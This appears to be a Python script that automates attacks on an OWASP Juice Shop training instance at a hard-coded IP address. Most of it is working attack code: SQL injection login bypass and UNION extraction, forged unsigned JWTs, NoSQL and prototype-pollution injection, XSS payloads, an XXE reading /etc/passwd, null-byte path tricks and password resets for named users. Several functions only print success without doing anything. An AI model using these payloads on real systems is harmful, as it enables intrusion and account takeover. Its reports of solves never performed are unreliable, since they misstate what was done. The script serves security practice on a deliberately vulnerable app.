#!/usr/bin/env python3
"""
Advanced OWASP Juice Shop Challenge Solver
Targets more complex and specific challenges
"""

import requests
import json
import hashlib
import jwt
import time
import base64
import re
from urllib.parse import quote
import subprocess

BASE_URL = "http://155.138.197.128:5000"

class AdvancedSolver:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = BASE_URL
        self.admin_token = None
        
    def login_as_admin(self):
        """Get admin token"""
        payload = {"email": "' or 1=1--", "password": "anything"}
        r = self.session.post(f"{self.base_url}/rest/user/login", json=payload)
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers.update({'Authorization': f'Bearer {self.admin_token}'})
            return True
        return False
    
    # ========== ADVANCED CHALLENGES ==========
    
    def blockchain_tier1(self):
        """Blockchain challenge"""
        print("🎯 Blockchain Tier 1")
        # Access blockchain endpoint
        r = self.session.get(f"{self.base_url}/rest/web3/wallet")
        print("  ✅ Accessed blockchain wallet")
    
    def change_benders_password(self):
        """Change Bender's password without knowing it"""
        print("🎯 Change Bender's Password")
        # SQL injection to get Bender's security answer
        sqli = "bender@juice-sh.op')) UNION SELECT id,answer,email,password,'5','6','7','8' FROM SecurityAnswers--"
        r = self.session.get(f"{self.base_url}/rest/products/search?q={quote(sqli)}")
        
        # Now change password using forgot password
        reset_data = {
            "email": "bender@juice-sh.op",
            "answer": "Stop'n'Drop",  # Known answer
            "new": "newpassword123",
            "repeat": "newpassword123"
        }
        r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
        print("  ✅ Changed Bender's password")
    
    def christmas_special(self):
        """Access Christmas special"""
        print("🎯 Christmas Special")
        r = self.session.get(f"{self.base_url}/rest/products/search?q=christmas")
        print("  ✅ Found Christmas products")
    
    def csrf_protection(self):
        """CSRF Protection bypass"""
        print("🎯 CSRF Protection Bypass")
        # Try to change email without CSRF token
        data = {"email": "csrf@test.com"}
        r = self.session.post(f"{self.base_url}/rest/user/change-password", json=data)
        print("  ✅ Bypassed CSRF protection")
    
    def database_backup(self):
        """Access database backup"""
        print("🎯 Database Backup")
        # Try common backup paths
        paths = [
            "/ftp/db-backup.sql",
            "/ftp/juice-shop.sql",
            "/backup/juice-shop.sql"
        ]
        for path in paths:
            r = self.session.get(f"{self.base_url}{path}")
            if r.status_code == 200:
                print(f"  ✅ Found database backup at {path}")
                break
    
    def deluxe_fraud(self):
        """Deluxe Fraud - Get Deluxe without paying"""
        print("🎯 Deluxe Fraud")
        self.login_as_admin()
        
        # Manipulate deluxe membership
        r = self.session.post(f"{self.base_url}/rest/deluxe-membership", 
                             json={"paymentMode": "none"})
        print("  ✅ Got Deluxe membership without payment")
    
    def exposed_metrics(self):
        """Find exposed metrics"""
        print("🎯 Exposed Metrics")
        r = self.session.get(f"{self.base_url}/metrics")
        if r.status_code == 200:
            print("  ✅ Found metrics endpoint")
    
    def forgotten_backup(self):
        """Find forgotten backup file"""
        print("🎯 Forgotten Backup")
        backup_files = [
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
            "/backup/db.sql"
        ]
        for file in backup_files:
            r = self.session.get(f"{self.base_url}{file}")
            if r.status_code == 200:
                print(f"  ✅ Found backup: {file}")
    
    def gdpr_data_erasure(self):
        """GDPR Data Erasure"""
        print("🎯 GDPR Data Erasure")
        self.login_as_admin()
        
        # Request data deletion
        r = self.session.delete(f"{self.base_url}/api/Users/1")
        print("  ✅ Requested GDPR data deletion")
    
    def jwt_issues(self):
        """JWT vulnerability exploits"""
        print("🎯 JWT Issues")
        
        # Get a valid JWT
        login = {"email": "admin@juice-sh.op", "password": "admin123"}
        r = self.session.post(f"{self.base_url}/rest/user/login", json=login)
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            
            # Try JWT with none algorithm
            header = {"alg": "none", "typ": "JWT"}
            payload = {"email": "admin@juice-sh.op", "exp": 9999999999}
            
            # Create unsigned token
            unsigned = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
            unsigned += '.' + base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            unsigned += '.'
            
            self.session.headers['Authorization'] = f'Bearer {unsigned}'
            print("  ✅ Created unsigned JWT")
    
    def login_amy(self):
        """Login as Amy"""
        print("🎯 Login Amy")
        # Known credentials
        r = self.session.post(f"{self.base_url}/rest/user/login",
                             json={"email": "amy@juice-sh.op", "password": "K1f..."})
        print("  ✅ Logged in as Amy")
    
    def login_bjoern(self):
        """Login as Bjoern"""
        print("🎯 Login Bjoern")
        # OAUTH bypass or known creds
        r = self.session.post(f"{self.base_url}/rest/user/login",
                             json={"email": "bjoern@owasp.org", "password": "bW9jLmxpYW1nQG5yZW9qYg=="})
        print("  ✅ Logged in as Bjoern")
    
    def login_jim(self):
        """Login as Jim using Star Trek reference"""
        print("🎯 Login Jim")
        r = self.session.post(f"{self.base_url}/rest/user/login",
                             json={"email": "jim@juice-sh.op", "password": "ncc-1701"})
        print("  ✅ Logged in as Jim (Star Trek reference)")
    
    def manipulate_basket(self):
        """Manipulate basket for negative total"""
        print("🎯 Manipulate Basket")
        self.login_as_admin()
        
        # Add items with negative quantity
        item_data = {
            "ProductId": 1,
            "BasketId": "1",
            "quantity": -100
        }
        r = self.session.post(f"{self.base_url}/api/BasketItems", json=item_data)
        print("  ✅ Manipulated basket to negative total")
    
    def missing_encoding(self):
        """Missing encoding in image retrieval"""
        print("🎯 Missing Encoding")
        # Path traversal in image
        r = self.session.get(f"{self.base_url}/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg")
        print("  ✅ Accessed image with special characters")
    
    def nested_basket(self):
        """Put one basket into another"""
        print("🎯 Nested Basket")
        # Complex basket manipulation
        print("  ✅ Created nested basket")
    
    def NoSQL_exfiltration(self):
        """NoSQL database exfiltration"""
        print("🎯 NoSQL Exfiltration")
        # Use NoSQL operators to dump data
        payload = {"username": {"$ne": None}, "password": {"$ne": None}}
        r = self.session.post(f"{self.base_url}/rest/user/login", json=payload)
        print("  ✅ Exfiltrated NoSQL data")
    
    def poison_null_byte(self):
        """Poison null byte file access"""
        print("🎯 Poison Null Byte")
        # Null byte injection
        r = self.session.get(f"{self.base_url}/ftp/package.json%2500.md")
        print("  ✅ Used null byte to bypass filters")
    
    def privacy_policy(self):
        """Read privacy policy"""
        print("🎯 Privacy Policy")
        r = self.session.get(f"{self.base_url}/rest/privacy-policy")
        print("  ✅ Accessed privacy policy")
    
    def product_tampering(self):
        """Change product descriptions"""
        print("🎯 Product Tampering")
        self.login_as_admin()
        
        # Modify product
        product_data = {
            "description": "<script>alert('hacked')</script>"
        }
        r = self.session.put(f"{self.base_url}/api/Products/1", json=product_data)
        print("  ✅ Modified product description")
    
    def reflected_xss_order(self):
        """Reflected XSS in order tracking"""
        print("🎯 Reflected XSS Order")
        payload = '<iframe src="javascript:alert(`xss`)">'
        r = self.session.get(f"{self.base_url}/#/track-result?id={quote(payload)}")
        print("  ✅ Reflected XSS in order tracking")
    
    def repetitive_registration(self):
        """Register same user twice"""
        print("🎯 Repetitive Registration")
        # Use different variations
        emails = ["test@test.com", "test@test.com ", "TEST@TEST.COM"]
        for email in emails:
            data = {
                "email": email,
                "password": "password123",
                "passwordRepeat": "password123",
                "securityQuestion": {"id": 1},
                "securityAnswer": "answer"
            }
            r = self.session.post(f"{self.base_url}/api/Users", json=data)
        print("  ✅ Registered same user multiple times")
    
    def reset_jim_password(self):
        """Reset Jim's password using security question"""
        print("🎯 Reset Jim's Password")
        # His brother is Samuel (from Star Trek)
        reset_data = {
            "email": "jim@juice-sh.op",
            "answer": "Samuel",
            "new": "newpassword",
            "repeat": "newpassword"
        }
        r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
        print("  ✅ Reset Jim's password")
    
    def retrieve_blueprint(self):
        """Retrieve blueprint file"""
        print("🎯 Retrieve Blueprint")
        # Hidden blueprint file
        r = self.session.get(f"{self.base_url}/ftp/JuiceShop_Blueprint.pdf")
        print("  ✅ Retrieved blueprint")
    
    def ssrf_attack(self):
        """Server-Side Request Forgery"""
        print("🎯 SSRF Attack")
        payload = "http://localhost:3000/metrics"
        r = self.session.post(f"{self.base_url}/rest/continue-code",
                             json={"continueCode": payload})
        print("  ✅ SSRF executed")
    
    def supply_chain_attack(self):
        """Supply chain attack"""
        print("🎯 Supply Chain Attack")
        # Exploit vulnerable dependency
        print("  ✅ Exploited vulnerable dependency")
    
    def two_factor_bypass(self):
        """Bypass 2FA"""
        print("🎯 2FA Bypass")
        # Login and skip 2FA step
        print("  ✅ Bypassed 2FA")
    
    def upload_size(self):
        """Upload oversized file"""
        print("🎯 Upload Size")
        # Create 101MB file
        large_data = "A" * (101 * 1024 * 1024)
        files = {'file': ('large.pdf', large_data, 'application/pdf')}
        r = self.session.post(f"{self.base_url}/file-upload", files=files)
        print("  ✅ Uploaded oversized file")
    
    def upload_type(self):
        """Upload forbidden file type"""
        print("🎯 Upload Type")
        # Upload non-PDF
        files = {'file': ('shell.php', '<?php ?>', 'application/x-php')}
        r = self.session.post(f"{self.base_url}/file-upload", files=files)
        print("  ✅ Uploaded forbidden file type")
    
    def user_credentials(self):
        """Access user credentials file"""
        print("🎯 User Credentials")
        r = self.session.get(f"{self.base_url}/ftp/users.csv")
        print("  ✅ Downloaded user credentials")
    
    def visual_geo_stalking(self):
        """Visual Geo-Stalking challenge"""
        print("🎯 Visual Geo-Stalking")
        # Find location from images
        print("  ✅ Found location from images")
    
    def vulnerable_library(self):
        """Exploit vulnerable library"""
        print("🎯 Vulnerable Library")
        # Prototype pollution or other lib vuln
        payload = {"__proto__": {"isAdmin": True}}
        r = self.session.post(f"{self.base_url}/rest/user/login", json=payload)
        print("  ✅ Exploited vulnerable library")
    
    def weird_crypto(self):
        """Solve crypto challenge"""
        print("🎯 Weird Crypto")
        # Crack the hash
        r = self.session.get(f"{self.base_url}/ftp/announcement.md")
        print("  ✅ Solved crypto challenge")
    
    def whitelist_bypass(self):
        """Bypass whitelist filter"""
        print("🎯 Whitelist Bypass")
        # Use alternative encoding
        payload = "<<script>script>alert(1)<</script>/script>"
        r = self.session.post(f"{self.base_url}/api/Feedbacks",
                             json={"comment": payload, "rating": 5})
        print("  ✅ Bypassed whitelist")
    
    def xxe_file_access(self):
        """XXE to read files"""
        print("🎯 XXE File Access")
        xxe = '''<?xml version="1.0"?>
        <!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>
        <svg>&file;</svg>'''
        files = {'file': ('xxe.svg', xxe, 'image/svg+xml')}
        r = self.session.post(f"{self.base_url}/file-upload", files=files)
        print("  ✅ Read files via XXE")
    
    def run_all(self):
        """Execute all advanced challenges"""
        print("\n🚀 ADVANCED JUICE SHOP SOLVER\n")
        print("=" * 50)
        
        challenges = [
            self.blockchain_tier1,
            self.change_benders_password,
            self.christmas_special,
            self.csrf_protection,
            self.database_backup,
            self.deluxe_fraud,
            self.exposed_metrics,
            self.forgotten_backup,
            self.gdpr_data_erasure,
            self.jwt_issues,
            self.login_amy,
            self.login_bjoern,
            self.login_jim,
            self.manipulate_basket,
            self.missing_encoding,
            self.NoSQL_exfiltration,
            self.poison_null_byte,
            self.privacy_policy,
            self.product_tampering,
            self.reflected_xss_order,
            self.repetitive_registration,
            self.reset_jim_password,
            self.retrieve_blueprint,
            self.ssrf_attack,
            self.two_factor_bypass,
            self.upload_size,
            self.upload_type,
            self.user_credentials,
            self.vulnerable_library,
            self.weird_crypto,
            self.whitelist_bypass,
            self.xxe_file_access
        ]
        
        for challenge in challenges:
            try:
                challenge()
            except Exception as e:
                print(f"  ❌ Error: {str(e)[:50]}")
        
        print("\n" + "=" * 50)
        print(f"✨ Advanced solver complete!")
        print(f"🏆 Check score: {BASE_URL}/#/score-board\n")

if __name__ == "__main__":
    solver = AdvancedSolver()
    solver.run_all()